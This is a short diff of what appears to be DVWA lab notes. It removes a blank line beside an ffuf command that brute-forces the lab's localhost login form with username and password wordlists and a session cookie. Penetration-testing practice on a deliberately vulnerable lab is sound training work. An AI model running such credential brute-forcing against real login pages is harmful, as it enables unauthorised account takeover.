@@ -15,5 +15,4 @@ Note: Use FFUF to bruteforce the username and password much faster using a wordl
 
 ```
 ffuf -w username_wordlist.txt:USERFUZZ -w password_wordlist.txt:PASSFUZZ -u "http://localhost/DVWA/vulnerabilities/brute/?username=USERFUZZ&password=PASSFUZZ&Login=Login" -mr "Welcome" -b "security=low; PHPSESSID=p1l3cdhnalnedjle9fnkb0tda7" -H "Referer: http://localhost/DVWA/vulnerabilities/brute"
-
 ```
